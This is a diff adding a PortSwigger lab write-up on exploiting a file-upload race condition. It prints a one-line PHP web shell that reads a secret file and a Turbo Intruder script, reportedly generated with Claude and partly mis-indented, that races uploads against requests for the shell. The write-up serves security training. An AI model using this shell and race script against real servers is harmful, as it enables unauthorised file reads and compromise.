@@ -221,3 +221,55 @@ Content-Length: 49
 - As much as possible, use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms.
 
 ---
+## Lab: Web Shell Upload Via Race Condition:
+
+https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
+
+This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.
+
+To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+The application has the file upload vulnerability via race condition. First login with the provided credentials and then try to upload a basic php script to see the secret of carlos and send that post request to the turbo intruder which is an extension used to send multiple request concurrently.
+
+The php script that i used was:
+
+`<?php echo file_get_contents('/home/carlos/secret'); ?>`
+
+![Race condition turbo intruder upload](1.png)
+
+This is the turbo intruder and in it we have our post request and now we need to write a script to send the concurrent request. First send POST request and while sending POST request also send the GET request. I used `claude` to generate this script:
+
+```python
+def queueRequests(target, wordlists):
+engine = RequestEngine(endpoint=target.endpoint,
+concurrentConnections=30,
+engine=Engine.THREADED
+)
+
+# The GET request to the file we're trying to catch mid-upload
+get_req = (
+    'GET /files/avatars/basic_php_exploit_to_retreive_from_home_carlos_secrets.php HTTP/1.1\r\n'
+    'Host: 0a6500f5043e855680e75dc100300093.web-security-academy.net\r\n'
+    'Cookie: session=sQ5UBbZDnPGC1IxJPlCs09r1BTVS6aH0\r\n'
+    'Connection: close\r\n'
+    '\r\n'
+)
+
+# Queue several upload attempts (target.req = the POST request loaded in this tab)
+for i in range(10):
+    engine.queue(target.req, gate='race1')
+
+# Queue several GET attempts to try to catch the file mid-race
+for i in range(20):
+    engine.queue(get_req, gate='race1')
+
+# Release all of them together, in the same instant
+engine.openGate('race1')
+
+def handleResponse(req, interesting):
+table.add(req)
+```
+
+![Race condition turbo intruder script](2.png)
